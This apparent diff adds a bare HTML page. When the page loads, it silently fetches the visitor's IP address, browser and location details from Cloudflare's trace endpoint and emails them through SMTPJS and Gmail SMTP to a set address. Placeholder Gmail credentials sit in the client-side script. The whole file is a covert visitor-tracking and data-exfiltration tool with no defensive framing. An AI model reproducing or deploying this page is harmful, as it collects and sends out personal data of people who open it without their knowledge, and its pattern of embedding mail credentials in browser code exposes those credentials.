@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<body>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
+<script src="https://smtpjs.com/v3/smtp.js"></script>
+<script type="text/javascript">
+//setting lesssecureapps from your email
+$.get('https://www.cloudflare.com/cdn-cgi/trace', function(data) {
+
+    Email.send({
+    Host : "smtp.gmail.com",
+    Username : "myemail@gmail.com",
+    Password : "mypassword",
+    To : 'targetemail',
+    From : "fromemail",
+    Subject : "INFO",
+    Body : data
+}).then(
+  message => alert(message)
+);
+
+})
+
+
+</script>
+</body>
+</html>
